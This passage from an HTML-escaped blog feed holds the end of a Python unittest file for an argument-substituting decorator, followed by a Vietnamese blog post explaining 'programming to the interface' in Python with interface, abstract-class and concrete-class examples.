        &lt;span class="bp"&gt;self&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;assertEqual&lt;/span&gt;&lt;span class="p"&gt;((&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;ignore&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;done&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;),&lt;/span&gt;
                &lt;span class="n"&gt;orig_func_1&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;ignore&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;arg_name&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="n"&gt;marker&lt;/span&gt;&lt;span class="p"&gt;))&lt;/span&gt;
        &lt;span class="bp"&gt;self&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;assertEqual&lt;/span&gt;&lt;span class="p"&gt;((&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;ignore&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;not_replace&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;),&lt;/span&gt;
                &lt;span class="n"&gt;orig_func_1&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;ignore&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;arg_name&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;not_replace&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;))&lt;/span&gt;

    &lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;test_keyword_2&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="bp"&gt;self&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;

        &lt;span class="n"&gt;marker_1&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;replace_me&amp;#39;&lt;/span&gt;
        &lt;span class="n"&gt;marker_2&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;replace_too&amp;#39;&lt;/span&gt;

        &lt;span class="nd"&gt;@passthru_auto_argument&lt;/span&gt;&lt;span class="p"&gt;([(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;arg_1&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;marker_1&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;done&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;),&lt;/span&gt;
                                 &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;arg_2&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;marker_2&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;enod&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)])&lt;/span&gt;
        &lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;orig_func_0&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;arg_1&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="n"&gt;marker_1&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;arg_2&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="n"&gt;marker_2&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
            &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="n"&gt;arg_1&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;arg_2&lt;/span&gt;

        &lt;span class="bp"&gt;self&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;assertEqual&lt;/span&gt;&lt;span class="p"&gt;((&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;done&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;enod&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;),&lt;/span&gt; &lt;span class="n"&gt;orig_func_0&lt;/span&gt;&lt;span class="p"&gt;())&lt;/span&gt;
        &lt;span class="bp"&gt;self&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;assertEqual&lt;/span&gt;&lt;span class="p"&gt;((&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;not_replace&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;enod&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;),&lt;/span&gt; &lt;span class="n"&gt;orig_func_0&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;not_replace&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;))&lt;/span&gt;
        &lt;span class="bp"&gt;self&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;assertEqual&lt;/span&gt;&lt;span class="p"&gt;((&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;done&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;not&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;),&lt;/span&gt; &lt;span class="n"&gt;orig_func_0&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;marker_1&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;not&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;))&lt;/span&gt;
        &lt;span class="bp"&gt;self&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;assertEqual&lt;/span&gt;&lt;span class="p"&gt;((&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;done&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;enod&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;),&lt;/span&gt; &lt;span class="n"&gt;orig_func_0&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;marker_1&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;marker_2&lt;/span&gt;&lt;span class="p"&gt;))&lt;/span&gt;
        &lt;span class="bp"&gt;self&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;assertEqual&lt;/span&gt;&lt;span class="p"&gt;((&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;not_1&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;not_2&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;),&lt;/span&gt; &lt;span class="n"&gt;orig_func_0&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;not_1&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;not_2&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;))&lt;/span&gt;

        &lt;span class="nd"&gt;@passthru_auto_argument&lt;/span&gt;&lt;span class="p"&gt;([(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;arg_1&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;marker_1&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;done&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;),&lt;/span&gt;
                                 &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;arg_2&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;marker_2&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;enod&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)])&lt;/span&gt;
        &lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;orig_func_1&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;junk&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;arg_1&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="n"&gt;marker_1&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;arg_2&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="n"&gt;marker_2&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
            &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="n"&gt;junk&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;arg_1&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;arg_2&lt;/span&gt;

        &lt;span class="bp"&gt;self&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;assertEqual&lt;/span&gt;&lt;span class="p"&gt;((&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;.&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;done&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;enod&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;),&lt;/span&gt; &lt;span class="n"&gt;orig_func_1&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;.&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;))&lt;/span&gt;
        &lt;span class="bp"&gt;self&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;assertEqual&lt;/span&gt;&lt;span class="p"&gt;((&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;.&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;not_replace&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;enod&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;),&lt;/span&gt;
                         &lt;span class="n"&gt;orig_func_1&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;.&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;not_replace&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;))&lt;/span&gt;
        &lt;span class="bp"&gt;self&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;assertEqual&lt;/span&gt;&lt;span class="p"&gt;((&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;.&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;done&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;not&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;),&lt;/span&gt;
                         &lt;span class="n"&gt;orig_func_1&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;.&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;marker_1&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;not&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;))&lt;/span&gt;
        &lt;span class="bp"&gt;self&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;assertEqual&lt;/span&gt;&lt;span class="p"&gt;((&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;.&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;done&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;enod&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;),&lt;/span&gt;
                         &lt;span class="n"&gt;orig_func_1&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;.&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;marker_1&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;marker_2&lt;/span&gt;&lt;span class="p"&gt;))&lt;/span&gt;
        &lt;span class="bp"&gt;self&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;assertEqual&lt;/span&gt;&lt;span class="p"&gt;((&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;.&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;not_1&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;not_2&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;),&lt;/span&gt;
                         &lt;span class="n"&gt;orig_func_1&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;.&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;not_1&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;not_2&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;))&lt;/span&gt;

    &lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;test_subclass&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="bp"&gt;self&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;

        &lt;span class="k"&gt;class&lt;/span&gt; &lt;span class="nc"&gt;auto_dict_argument&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;callable_auto_argument&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;

            &lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="fm"&gt;__init__&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="bp"&gt;self&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="n"&gt;names&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
                &lt;span class="n"&gt;names_markers_values&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="p"&gt;[]&lt;/span&gt;
                &lt;span class="k"&gt;for&lt;/span&gt; &lt;span class="n"&gt;name&lt;/span&gt; &lt;span class="ow"&gt;in&lt;/span&gt; &lt;span class="n"&gt;names&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
                    &lt;span class="n"&gt;names_markers_values&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;append&lt;/span&gt;&lt;span class="p"&gt;((&lt;/span&gt;&lt;span class="n"&gt;name&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="bp"&gt;None&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nb"&gt;dict&lt;/span&gt;&lt;span class="p"&gt;))&lt;/span&gt;
                &lt;span class="nb"&gt;super&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;auto_dict_argument&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="bp"&gt;self&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="fm"&gt;__init__&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;names_markers_values&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;

        &lt;span class="nd"&gt;@auto_dict_argument&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;arg_1&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;arg_2&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
        &lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;test_func&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;arg_1&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="bp"&gt;None&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;arg_2&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="bp"&gt;None&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
            &lt;span class="n"&gt;arg_1&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;1&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;arg_1&amp;#39;&lt;/span&gt;
            &lt;span class="n"&gt;arg_2&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;2&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;arg_2&amp;#39;&lt;/span&gt;
            &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;arg_1&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;arg_2&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;

        &lt;span class="bp"&gt;self&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;assertEqual&lt;/span&gt;&lt;span class="p"&gt;(({&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;1&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;arg_1&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;},&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;2&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;arg_2&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;}),&lt;/span&gt; &lt;span class="n"&gt;test_func&lt;/span&gt;&lt;span class="p"&gt;())&lt;/span&gt;
        &lt;span class="n"&gt;arg_1&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;arg_2&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;test_func&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;
        &lt;span class="bp"&gt;self&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;assertNotEqual&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nb"&gt;id&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;arg_1&lt;/span&gt;&lt;span class="p"&gt;),&lt;/span&gt; &lt;span class="nb"&gt;id&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;arg_2&lt;/span&gt;&lt;span class="p"&gt;))&lt;/span&gt;


&lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="vm"&gt;__name__&lt;/span&gt; &lt;span class="o"&gt;==&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;__main__&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
    &lt;span class="n"&gt;unittest&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;main&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;/div&gt;
</content><category term="default"></category><category term="auto_argument"></category><category term="argument"></category><category term="decorator"></category></entry><entry><title>Lập trình giao diện trong Python</title><link href="/2012/07/lap-trinh-giao-dien-trong-python.html" rel="alternate"></link><published>2012-07-18T06:06:00+07:00</published><updated>2012-07-18T06:06:00+07:00</updated><author><name>Nguyễn Thành Nam</name></author><id>tag:None,2012-07-18:/2012/07/lap-trinh-giao-dien-trong-python.html</id><summary type="html">&lt;p&gt;Bài viết này bàn về hướng lập trình giao diện (programming to the interface) thay vì giao diện người dùng, hay giao diện đồ họa (user interface, graphical interface).&lt;/p&gt;
&lt;div class="section" id="lap-trinh-giao-dien"&gt;
&lt;h2&gt;Lập trình giao diện&lt;/h2&gt;
&lt;p&gt;Lập trình giao diện (giao tiếp) là một trong hai nguyên tắc cơ bản được nhắc đến …&lt;/p&gt;&lt;/div&gt;</summary><content type="html">&lt;p&gt;Bài viết này bàn về hướng lập trình giao diện (programming to the interface) thay vì giao diện người dùng, hay giao diện đồ họa (user interface, graphical interface).&lt;/p&gt;
&lt;div class="section" id="lap-trinh-giao-dien"&gt;
&lt;h2&gt;Lập trình giao diện&lt;/h2&gt;
&lt;p&gt;Lập trình giao diện (giao tiếp) là một trong hai nguyên tắc cơ bản được nhắc đến trong quyển sách kinh điển &lt;strong&gt;Design Patterns&lt;/strong&gt;. Lập trình giao diện đặt trọng tâm vào việc tạo ra một hợp đồng (contract) chắc chắn giữa hai bên người dùng (consumer) và người cung cấp (producer):&lt;/p&gt;
&lt;dl class="docutils"&gt;
&lt;dt&gt;Người dùng&lt;/dt&gt;
&lt;dd&gt;là bên sử dụng các lớp, hàm, hoặc mã mà người cung cấp tạo ra&lt;/dd&gt;
&lt;dt&gt;Người cung cấp&lt;/dt&gt;
&lt;dd&gt;là bên tạo ra thư viện mã&lt;/dd&gt;
&lt;dt&gt;Hợp đồng&lt;/dt&gt;
&lt;dd&gt;là các kiến thức chung mà cả người dùng và người cung cấp đều hiểu và tuân theo&lt;/dd&gt;
&lt;/dl&gt;
&lt;p&gt;Hợp đồng xác định các lớp cơ bản, và các phương thức của các lớp đó. Vì đây là hợp đồng được cả hai bên tuân theo nên ý nghĩa của các lớp, cũng như cách hoạt động của các phương thức phải được định nghĩa một cách tường minh và chuẩn xác. Người dùng sẽ dựa theo hợp đồng này và sử dụng các lớp trong đó cho mục đích riêng của họ, trong khi người cung cấp có thể thay đổi cách hiện thực hợp đồng một cách khả chuyển miễn sao vẫn đảm bảo được yêu cầu của hợp đồng.&lt;/p&gt;
&lt;p&gt;Ví dụ: hợp đồng nêu ra là hàm &lt;strong&gt;func&lt;/strong&gt; nhận vào một số nguyên, và trả về tổng của số nguyên đó với 2. Hợp đồng này rõ ràng ví nó xác định tên hàm (&lt;strong&gt;func&lt;/strong&gt;), giá trị đầu vào (&lt;strong&gt;một số nguyên&lt;/strong&gt;) và giá trị đầu ra (&lt;strong&gt;tổng của số nguyên nhập vào với 2&lt;/strong&gt;). Người sử dụng, khi cần tính tổng của 5 và 2, có thể gọi &lt;strong&gt;func(5)&lt;/strong&gt;. Người cung cấp có thể cài đặt &lt;strong&gt;def func(i): return i + 2&lt;/strong&gt; hoặc &lt;strong&gt;func = lambda i: i + 2&lt;/strong&gt; hoặc một cách nào khác miễn sao phù hợp với câu chữ của hợp đồng.&lt;/p&gt;
&lt;p&gt;Theo quan điểm này, người sử dụng và người cung cấp giao tiếp với nhau thông qua một môi trường chung, một giao diện chung. Người sử dụng dựa trên giao diện này để yêu cầu dịch vụ từ người cung cấp. Còn người cung cấp dựa trên giao diện này để đáp ứng đúng yêu cầu người sử dụng.&lt;/p&gt;
&lt;p&gt;Đối với các ngôn ngữ lập trình hướng đối tượng, chúng ta hay gặp các thuật ngữ như giao diện (&lt;strong&gt;interface&lt;/strong&gt;), lớp trừu tượng (&lt;strong&gt;abstract class&lt;/strong&gt;) và lớp cụ thể (&lt;strong&gt;concrete class&lt;/strong&gt;). Giao diện mang tính chất của một hợp đồng, hoàn toàn không có bất kỳ một hiện thực cụ thể nào. Lớp cụ thể là một hiện thực đầy đủ của một giao diện. Và lớp trừu tượng là một hiện thực chưa đầy đủ của một giao diện.&lt;/p&gt;
&lt;/div&gt;
&lt;div class="section" id="id1"&gt;
&lt;h2&gt;Lập trình giao diện trong Python&lt;/h2&gt;
&lt;p&gt;Python không có sự phân biệt giữa ba khái niệm này. Tuy nhiên, trong thực tế, chúng ta hay viết mã tương tự như sau để mô phỏng một giao diện.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="k"&gt;class&lt;/span&gt; &lt;span class="nc"&gt;Interface&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nb"&gt;object&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
    &lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;method_1&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="bp"&gt;self&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
        &lt;span class="k"&gt;raise&lt;/span&gt; &lt;span class="ne"&gt;NotImplementedError&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;
    &lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;method_2&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="bp"&gt;self&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
        &lt;span class="k"&gt;raise&lt;/span&gt; &lt;span class="ne"&gt;NotImplementedError&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Các phương thức trong lớp &lt;strong&gt;Interface&lt;/strong&gt; chỉ có một câu lệnh duy nhất là &lt;strong&gt;raise NotImplementedError()&lt;/strong&gt; để cố tình gây ra biệt lệ khi chúng được gọi.&lt;/p&gt;
&lt;p&gt;Một lớp trừu tượng có thể được mô phỏng như sau:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="k"&gt;class&lt;/span&gt; &lt;span class="nc"&gt;AbstractClass&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;Interface&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
    &lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;method_1&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="bp"&gt;self&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
        &lt;span class="c1"&gt;# làm một việc gì đó&lt;/span&gt;
        &lt;span class="k"&gt;pass&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Lớp &lt;strong&gt;AbstractClass&lt;/strong&gt; là lớp con của &lt;strong&gt;Interface&lt;/strong&gt; và hiện thực hóa phương thức &lt;strong&gt;method_1&lt;/strong&gt; nhưng vẫn để phương thức &lt;strong&gt;method_2&lt;/strong&gt; lơ lửng.&lt;/p&gt;
&lt;p&gt;Cuối cùng, một lớp cụ thể là một lớp con của &lt;strong&gt;Interface&lt;/strong&gt; hoặc &lt;strong&gt;AbstractClass&lt;/strong&gt; nhưng hiện thực hóa tất cả các phương thức.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="k"&gt;class&lt;/span&gt; &lt;span class="nc"&gt;ConcreteClass&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;AbstractClass&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
    &lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;method_2&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="bp"&gt;self&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
        &lt;span class="c1"&gt;# làm một việc gì đó&lt;/span&gt;
        &lt;span class="k"&gt;pass&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
